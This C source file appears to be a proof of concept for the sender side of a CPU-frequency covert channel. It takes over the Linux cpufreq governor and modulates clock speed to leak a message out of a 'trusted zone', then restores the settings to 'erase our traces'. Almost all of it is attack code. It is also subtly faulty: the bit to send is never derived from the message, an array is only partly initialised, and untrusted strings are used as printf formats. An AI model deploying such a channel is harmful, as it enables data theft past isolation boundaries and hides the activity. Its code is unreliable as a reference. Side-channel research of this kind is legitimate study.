/*   NO RIGHTS RETAINED.
 *
 *   Permission is granted to copy, distribute and/or modify this document
 *   under the terms of the GNU Free Documentation License, Version 1.3
 *   or any later version published by the Free Software Foundation;
 *   with no Invariant Sections, no Front-Cover Texts, and no Back-Cover Texts.
 *
 *   THIS SOFTWARE IS PROVIDED 
 *  "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 *  LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 *  A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 *  OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
 *  SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
 *  LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 *  DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 *  THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 *  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 *  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

 #include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <errno.h>
#include <ctype.h>
#include <stdbool.h>

//int nanosleep(const struct timespec *req, struct timespec *rem);

#define MAX_LENGTH 50
#define REG_LENGTH 12
#define scaling_available_frequencies "/sys/devices/system/cpu/cpufreq/policy0/scaling_available_frequencies"
#define scaling_available_governors "/sys/devices/system/cpu/cpufreq/policy0/scaling_available_governors"
#define scaling_governor "/sys/devices/system/cpu/cpufreq/policy0/scaling_governor"
#define scaling_setspeed "/sys/devices/system/cpu/cpufreq/policy0/scaling_setspeed"

typedef enum {
    STR2INT_SUCCESS,
    STR2INT_OVERFLOW,
    STR2INT_UNDERFLOW,
    STR2INT_INCONVERTIBLE
} str2int_errno;

/*
* An auxiliary function to convert strings into ints.
*/
str2int_errno str2int(int *out, char *s, int base) {
    char *end;
    if (s[0] == '\0' || isspace(s[0]))
        return STR2INT_INCONVERTIBLE;
    errno = 0;
    long l = strtol(s, &end, base);
    /* Both checks are needed because INT_MAX == LONG_MAX is possible. */
    /*if (l > INT_MAX || (errno == ERANGE && l == LONG_MAX))
        return STR2INT_OVERFLOW;
    if (l < INT_MIN || (errno == ERANGE && l == LONG_MIN))
        return STR2INT_UNDERFLOW;*/
    if (*end != '\0')
        return STR2INT_INCONVERTIBLE;
    *out = l;
    return STR2INT_SUCCESS;
}

/*
* The spy process.
* This function transfers data from within the trusted zone.
*/
void spy_process(int t)
{
  
    printf("S: begin, tid = %ld\n", (long)pthread_self());

    char * data_to_transfer = "This is a covert secret message!";
    char byte_to_send;
    bool bit_to_send;

    int i=0,j=0;

    FILE* fp = NULL;  
    char buffer[MAX_LENGTH];
    char * token;
    int clk[REG_LENGTH];
    memset(clk,-1,10);    

    //struct timespec tempo_1;
    //tempo_1.tv_sec = 0;
    //tempo_1.tv_nsec = 1000L;

    /*struct timespec tempo_2;
    tempo_2.tv_sec = 0;
    tempo_2.tv_nsec = 100L;

    struct timespec tempo_3;
    tempo_3.tv_sec = 0;
    tempo_3.tv_nsec = 100L;*/

    char act_scaling_governor[REG_LENGTH];
    char act_scaling_frequency[REG_LENGTH];
 

    //Determine if the program can access the scaling frequencies
    fp = fopen(scaling_available_frequencies, "r");
	if(fp == NULL)
	{
	  	printf("S: scaling_available_frequencies not open\n");
	  	exit(1);
	}
	fgets(buffer, MAX_LENGTH, fp);
    fclose(fp);

    //Determine if the system has enough frequency domains to mount the attack
    token = strtok(buffer, " ");
	while (token) 
	{
		str2int(&j, token, 10);
    	clk[i] = j;
    	token = strtok(NULL, " ");
    	i++;
	}
	if(clk[0] == -1 || clk[1] == -1)
	{
		printf("S: not enough frequency domains available\n");
    	exit(1);
	}

	//Determine if the program can access the scaling governors
    fp = fopen(scaling_available_governors, "r");
	if(fp == NULL)
	{
	  	printf("S: scaling_available_governors not open\n");
	  	exit(1);
	}
	fgets(buffer, MAX_LENGTH, fp);
    fclose(fp); 

    //Determine if the userspace scaling governor is available
    if(strstr(buffer, "userspace") == NULL)
    {
    	printf("S: userspace governor not available\n");
    	exit(1);
    }

    //Store the original scaling governor and update it to userspace
    fp = fopen(scaling_governor, "w+");
	if(fp == NULL)
	{
	  	printf("S: scaling_governor not open\n");
	  	exit(1);
	}
	fgets(act_scaling_governor, REG_LENGTH, fp);
    fprintf(fp,"userspace\n");
    fclose(fp);

    //Store the original scaling speed
    fp = fopen(scaling_setspeed,"w+");
	if(fp == NULL)
	{
	  	printf("S: scaling_setspeed not open\n");
	  	exit(1);
	}
	fgets(act_scaling_frequency, REG_LENGTH, fp);
	fclose(fp);

	//Transmit the covert message
    for(i=0;i<strlen(data_to_transfer);i++)
    {
    	byte_to_send = data_to_transfer[i];
  	    for(j=0;j<8;j++)
  		{	

  	    	if(bit_to_send){
  	    		fp = fopen(scaling_setspeed,"w");
  	    		fprintf(fp,"%d",clk[0]);
  	    		fclose(fp);
  	    	}
  	    	else{
  	    		fp = fopen(scaling_setspeed,"w");
  	    		fprintf(fp,"%d",clk[1]);
  	    		fclose(fp);
  	    	}
  	    	//nanosleep(&tempo_1 , NULL);
  	    	usleep(t);

  	    	fp = fopen(scaling_setspeed,"w");
  	    	fprintf(fp,"%d",clk[2]);
  	    	fclose(fp);

  	    	//nanosleep(&tempo_1 , NULL);
  	    	usleep(t);
  	    }
    }

    //We restore the system status to erase our traces :)

    //Restore scaling frequency
    fp = fopen(scaling_setspeed,"w");
	fprintf(fp, act_scaling_frequency);
	fclose(fp);
    
    //Restore scaling governor
    fp = fopen(scaling_governor, "w");
    fprintf(fp, act_scaling_governor);
    fclose(fp);

    //Drop a hint so that the receiver process can break
    fp = fopen("goodbye.txt", "w");
    fprintf(fp, "Goodbye!");
    fclose(fp);

    printf("S: finish \n");
}

int main(int argc,char** argv)
{
	int t = (int)strtoul(argv[1], NULL, 0);
	spy_process(t);
	
	return 0;
}
